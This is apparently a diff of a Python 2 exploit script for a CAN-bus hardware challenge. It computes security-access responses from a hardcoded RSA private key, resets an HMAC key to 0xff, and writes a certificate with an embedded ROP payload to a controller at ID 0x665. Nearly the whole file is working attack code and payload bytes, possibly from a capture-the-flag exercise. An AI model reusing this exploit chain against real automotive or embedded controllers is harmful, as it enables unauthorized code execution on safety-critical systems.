@@ -1,9 +1,6 @@
 import serial
-import sys
 from time import sleep
-import re
 import struct
-import wolframalpha
 
 def read_can_pack(can):
     buff=can.read(12)
@@ -20,9 +17,10 @@ def send_can_pack(can,id,data):
     #print "<-",data.encode("hex")
     can.write(buff)    
     
-def send_big_can_pack(can,buff,id):
+def send_pack(can,buff,id):
+    print hex(id),buff.encode("hex")
     if len(buff)/7<1:
-       send_can_pack(can,id,"\x00"+buff)
+       send_can_pack(can,id,chr(len(buff))+buff)
     else:
        hdr=struct.pack(">H",len(buff)|1<<12)
        send_can_pack(can,id,hdr+buff[:6])
@@ -36,10 +34,11 @@ def send_big_can_pack(can,buff,id):
             hdr=struct.pack("B",((i+1)&0xF)|2<<4)
             send_can_pack(can,id,hdr+buff[6+i*7:])
 
-def recv_big_can_pack(can):
+def recv_pack(can):
     id,data=read_can_pack(can)
     if ord(data[0])>>4==0:
-        return id,data
+        print hex(id),data[1:1+ord(data[0])].encode("hex")
+        return id,data[1:1+ord(data[0])]
     elif ord(data[0])>>4==1:
         exp_len=(ord(data[0])&0xF)<<8|ord(data[1])
         if exp_len<=6:
@@ -55,6 +54,7 @@ def recv_big_can_pack(can):
             if ord(data[0])&0xF!=i&0xF:
                 print "seq mismatch", ord(data[0])&0xF,i&0xF
             outbuff+=data[1:]
+        print hex(id),outbuff.encode("hex")
         return id,outbuff
 
 def gen_resp(chall):
@@ -62,44 +62,33 @@ def gen_resp(chall):
     q=69493
     e=31337
     d=690033473
-    return resp=pow(chall,d,p*q)
+    return pow(chall,d,p*q)
 
-def set_maintance_mode(can):
-    send_big_can_pack(can,"\x27\x01",0x665) #read challange
-    id,data=recv_big_can_pack(can)
+def auth(can):
+    send_pack(can,"\x27\x01",0x665) #read challange
+    id,data=recv_pack(can)
+
     chall=struct.unpack("Q",data[2:])[0]
-    print hex(id),data.encode('hex')
-    print "challange: ",chall
-
-    #resp=int(raw_input("enter resp: "))
+    print "challange: ",hex(chall)
     resp=gen_resp(chall)
-
-    print "sending resp",resp
+    print "sending resp",hex(resp)
     resp=struct.pack("Q",resp)
-    send_big_can_pack(can,"\x27\x00"+resp,0x665) #send resp
-    id,data=recv_big_can_pack(can)
-    print hex(id),data.encode('hex')
+
+    send_pack(can,"\x27\x00"+resp,0x665) #send resp
+    id,data=recv_pack(can)
     
 
 def set_hmac_ff(can):
-    send_big_can_pack(can,"\x31\x01\x43\x01",0x665) #set hmac key to 0xff
-    id,data=recv_big_can_pack(can)
-    print hex(id),data.encode('hex')
-
-def gen_key(can,buff):
-    send_big_can_pack(can,buff,0x776) 
-    id,data=recv_big_can_pack(can)
-    print hex(id),data.encode('hex')
+    send_pack(can,"\x31\x01\x43\x01",0x665) #set hmac key to 0xff
+    id,data=recv_pack(can)    
 
 def write_cert(can,cert):
     sz=len(cert)
     addr=0x40
     hdr=struct.pack("HH",addr,sz)    
 
-    send_big_can_pack(can,"\x3d\x22"+hdr+cert,0x665) 
-    id,data=recv_big_can_pack(can)
-
-    print hex(id),data.encode('hex')
+    send_pack(can,"\x3d\x22"+hdr+cert,0x665) 
+    id,data=recv_pack(can)
 
 def gen_cert(rop_payload):
     cert_name="1"
@@ -120,22 +109,13 @@ def gen_cert(rop_payload):
     
 
 #can=serial.Serial(port="COM11",baudrate=115200)
-can=serial.Serial(port="/dev/ttyUSB0",baudrate=115200)
+can=serial.Serial(port="/dev/ttyUSB1",baudrate=115200)
     
 while can.readline()!="CAN init OK\n":
     pass
 
-
-#cert=gen_cert("\x00\x4c\x68\x01\x01\x01\x00\x8b\xb2\x01\x01\x01\x00\x92\x5d\x72\x12\x00\x92\x59\x01\x01\x01\x01\x00\x8b\xb8")
-cert=gen_cert("\x00\x4c\x68\x01\x01\x01\x00\x8b\xb2\x01\x01\x01\x00\x92\x5d\x12\x12\x00\x92\x59\x01\x01\x01\x01\x00\x8b\xb8")
-#cert=gen_cert("\x4e\xe9\x0\x4e\xd9")
-#print cert.encode('hex')
-#gen_key(can,"")
-set_maintance_mode(can)
+cert=gen_cert("\x00\x4c\x68"+"\x01"*3+"\x00\x8b\xb2"+"\x01"*3+"\x00\x92\x5d"+"\x12\x72"+"\x00\x92\x59"+"\x01"*4+"\x00\x8b\xb8")
+#cert=gen_cert("\x00\x4e\xe9") #print "It's dangerous to go alone! take this."
+auth(can)
 set_hmac_ff(can)
 write_cert(can,cert)
-
-while True:
-    id,data=recv_big_can_pack(can)
-    print hex(id),data.encode('hex')
-
